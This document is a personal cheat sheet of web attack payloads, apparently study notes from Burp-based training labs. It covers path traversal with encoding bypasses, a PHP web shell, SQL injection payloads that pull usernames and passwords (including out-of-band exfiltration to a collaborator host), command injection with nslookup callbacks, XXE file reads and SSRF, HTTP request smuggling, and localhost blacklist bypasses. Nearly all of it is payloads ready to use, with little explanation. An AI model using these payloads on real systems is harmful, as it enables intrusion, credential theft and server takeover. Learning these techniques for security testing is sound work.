# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd

When server URL-decode of the input before using it.
>..%252f..%252f..%252fetc/passwd

When server require ending, like `png` , use null bytes, for example
>../../../etc/passwd%00.png





## **FILE UPLOAD**
Default way:
><?php echo system($_GET['command']); ?>

Flawed file type validation:
Change content type to image/jpeg

Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
Instead of 
`Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
  We can use
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  Or obfuscated versions


### **SQL INJECTION**

Login Bypass:

`administrator'--`

#Substring:

`SUBSTRING('foobar', 4, 2)`
Oracle `SUBSTR('foobar', 4, 2)`

#Simle WAF Bypass by encoding:

`<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>`

`<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`


### **UNION SQL INJECTION**

Simple Data Retrieve (request `SELECT name, description FROM products WHERE category = 'Gifts'`):

`' UNION SELECT username, password FROM users--`

**Oracle add `from dual`**

### Determine number of columns:

`' ORDER BY 3--`
Second method, allow to determine type of data in column:

`' UNION SELECT NULL,NULL,NULL--`/`' UNION SELECT 'a',NULL,NULL,NULL--`

### Concatenation of strings:

`' UNION SELECT username || '~' || password FROM users--`
Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.

## **BLIND SQL INJECTION**

### conditional based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

### error based

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

`'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

### visible errors based

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### time based

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

### out of band interaction

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`


## **Command Injection**

### Simple

`1|whoami`

### time delays

`email=x||ping+-c+10+127.0.0.1||`

### out of band interaction

`email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

## **XXE**

### retrieve files

` <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> `

### by xinclude

`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>`


### ssrf

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`


# HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.

## Test for CL.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
## Test for TE.CL
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```


## CL.TE
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0/49 char here

GET /404 HTTP/1.1
Foo: x
```
Front-end server support only Content-Length header, backend support Transfer-Encoding. Front pass all as 1 request, backend split into two and read second one as new request, which start from
word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error as here:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```






## TE.CL
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

/7c char
````
Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request. And next request passed to server will be added to this, and will arise error as here:
```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```




## TE.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 8
Transfer-Encoding: cow
Transfer-Encoding: chunked

0


G
```
Front-end server support Transfer-Encoding, but can be bypassed, to be readed backend server.
Bypass methods:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
**SSRF**
*Blacklist*
Change 127.0.0.1 for 
>127.1
>017700000001
>2130706433
>spoofed.burpcollaborator.net
